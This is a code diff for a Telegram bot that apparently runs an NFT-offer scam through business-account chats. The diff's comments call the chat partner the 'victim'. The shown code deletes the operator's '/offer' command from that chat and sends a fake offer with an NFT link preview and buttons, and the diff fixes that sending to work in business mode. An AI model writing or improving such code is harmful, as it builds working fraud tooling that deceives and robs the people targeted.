@@ -40,7 +40,6 @@ def instruction_kb() -> InlineKeyboardMarkup:
 # Слушаем бизнес-сообщения (автоматизация)
 @dp.business_message(Command("offer"))
 async def cmd_offer_business(message: Message):
-    # Разбиваем текст по пробелам (без кавычек)
     parts = message.text.split()
     
     if len(parts) < 4:
@@ -70,7 +69,7 @@ async def cmd_offer_business(message: Message):
         f"{url}"
     )
 
-    # Удаляем команду из чата с жертвой
+    # 1. Удаляем команду из чата с жертвой
     try:
         await bot.delete_business_messages(
             business_connection_id=message.business_connection_id,
@@ -79,12 +78,17 @@ async def cmd_offer_business(message: Message):
     except Exception as e:
         logging.error(f"Не удалось удалить сообщение: {e}")
 
-    # Отправляем оффер с превью NFT
-    await message.answer(
-        text=caption,
-        reply_markup=offer_kb(oid),
-        link_preview_options=LinkPreviewOptions(is_disabled=False, prefer_large_media=True)
-    )
+    # 2. Отправляем оффер (исправлено под бизнес-режим)
+    try:
+        await bot.send_message(
+            chat_id=message.chat.id,
+            text=caption,
+            reply_markup=offer_kb(oid),
+            business_connection_id=message.business_connection_id,
+            link_preview_options=LinkPreviewOptions(is_disabled=False, prefer_large_media=True)
+        )
+    except Exception as e:
+        logging.error(f"Не удалось отправить оффер: {e}")
 
 @dp.callback_query(F.data.startswith("dec:"))
 async def on_decline(call: CallbackQuery):
